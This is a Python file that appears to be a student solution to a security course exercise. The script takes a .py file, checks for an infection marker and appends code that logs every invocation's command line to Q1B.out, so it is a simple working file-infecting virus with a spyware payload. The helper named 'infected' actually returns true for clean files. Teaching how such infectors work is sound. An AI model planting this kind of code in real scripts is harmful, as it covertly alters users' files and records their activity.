"""
    Next, write another script, Q1B.py, that receives as parameter the name of a .py file in the current directory (including the .py), e.g., x.py. 
    Next, Q1B.py checks if the file contains a Python script, and if so, if the script does not yet contain the Virus. 
    
    If both checks are Ok, Q1B re-writes the file (x.py), so that the new “x.py” will contain a Python script with the same functionality as of the original x.py, 
    except that the new script will also perform the following simple spyware payload functionality. 
    
    Specifically, whenever the script in the new “x.py” is run, it would append, to the end of a file called Q1B.out, 
    a line containing the entire command line used to invoke it, i.e., the file/script name (“x.py”) 
    followed by the arguments (parameters) with which the script (“x.py”) was run, if any. 
    
    If Q1B.out does not exist when the new “x.py” is run, then “x.py” should create Q1B.out. 
"""
import os
import sys

def infected(filename):
    with open(filename, 'r') as file:
        content = file.read()
    return ("# virus end" not in content)


def spy(filename):
    with open(filename, 'a') as file:
        file.write("\n\n#-------------------------------------------------------------------\n")
        file.write("\nimport sys\n")
        file.write("with open('Q1B.out', 'a') as log_file:\n")
        file.write(" log_file.write(' '.join(sys.argv) + '\\n')\n")
        file.write("# virus end")


def main():
    if len(sys.argv) != 2:
        print('Enter file name: ')
        return
    filename = sys.argv[1]

    if filename.endswith('.py') and os.path.exists(filename):
        if infected(filename):
            spy(filename)
            print("You've just been spied")
        else:
            print("You were already spied :(")
    else:
        print("Incorrect file, try a different file")
        
if __name__ == "__main__":
    main()